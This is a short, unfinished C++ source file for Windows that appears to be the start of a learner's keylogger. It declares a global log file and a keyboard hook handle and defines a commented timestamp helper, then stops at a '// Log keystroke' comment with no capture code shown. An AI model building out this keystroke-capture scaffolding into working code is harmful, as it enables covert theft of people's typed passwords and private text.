#include <windows.h>
#include <fstream>          // Opening, writing, and closing files 
#include <iostream>
#include <string>
#include <ctime>			// Get time and format
#include <iomanip>			// formatting functions

// global variables


// file stream object
std::ofstream logFile;

// store the ID of our keyboard hook
HHOOK keyboardHook;

// track first keystroke of session
bool isFirstKey = true;


// time helper
std::string getFormattedTime() {
	// time_t is a data type in <ctime> used to store system time values
	// we name it "now" and set it to equal to time() which is the systems current time, typically
	// measured as a number of seconds eslapsed since January 1, 1970
	time_t now = time(0);

	struct tm timeinfo;

	// _s just means secure. 
	localtime_s(&timeinfo, &now);

	// storing formatted array
	char buffer[20];

	strftime(buffer, sizeof(buffer), "[%H:%M:%S]", &timeinfo);

	// convert c style string to c++ string
	return std::string(buffer);
}

// Log keystroke
 


